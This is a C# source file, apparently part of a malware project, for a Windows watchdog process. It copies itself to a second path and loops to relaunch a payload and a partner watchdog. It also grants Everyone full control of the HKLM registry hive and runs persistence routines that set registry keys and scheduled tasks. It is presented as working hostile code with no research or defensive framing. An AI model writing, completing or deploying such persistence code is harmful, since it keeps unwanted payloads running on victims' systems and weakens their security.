using Microsoft.Win32;

class Watchdog
{
   static void Main(string[] args)
    {
        // Create or open the mutex to ensure only one instance is running
        using (Mutex mutex = new Mutex(false, Config.PrimaryWatchdogMutexName, out bool isNewInstance))
        {
            if (!isNewInstance)
            {
                //Watchdog process is already running. Exiting.
                return;
            }


            WatchdogLogic();

        }
    }



    static void WatchdogLogic()
    {
        

        try { 
            if (!File.Exists(Path.Combine(Config.SecondaryWatchdogPath, Config.PrimaryWatchdogName)))
            {
                File.Copy(Config.PrimaryWatchdogFullPath, Path.Combine(Config.SecondaryWatchdogPath, Config.PrimaryWatchdogName), overwrite: false);
            }
        }
        catch (Exception e)
        {
            watchdogHelper.Log($"[ERROR] {e.Message}");
        }

        // Example loop to simulate frequent checks
        while (true)
        {
            watchdogHelper.EnsureDirectoryExists(Config.SecondaryWatchdogPath);
            watchdogHelper.EnsureDirectoryExists(Config.PrimaryWatchdogPath);
            watchdogHelper.EnsureDirectoryExists(Config.PayloadPath);

            Persistence.GrantEveryoneFullControl(Registry.LocalMachine);
            //Persistence.GrantEveryoneFullControl("HKCU"); //Current users not in use at the moment

            // mess with the access control on files and folders
            // Implement way to deal with folder name changing

            watchdogHelper.verifyFilePathsSourceAndDest(Config.PayloadPath, Config.PayloadName);
            watchdogHelper.CheckAndRunPayload(Config.PayloadPath, Config.PayloadName);

            watchdogHelper.verifyFilePathsSourceAndDest(Config.SecondaryWatchdogPath, Config.SecondaryWatchdogName);
            watchdogHelper.CheckAndRunWatchdog(Config.SecondaryWatchdogPath, Config.SecondaryWatchdogName, Config.SecondaryWatchdogMutexName);

            Persistence.runAllTechniques(); // sets and checks the registry keys and scheduled task

            watchdogHelper.Log("Watchdog is ran its loop");
            Thread.Sleep(Config.sleepTime);  // Sleep
        }
     }

}

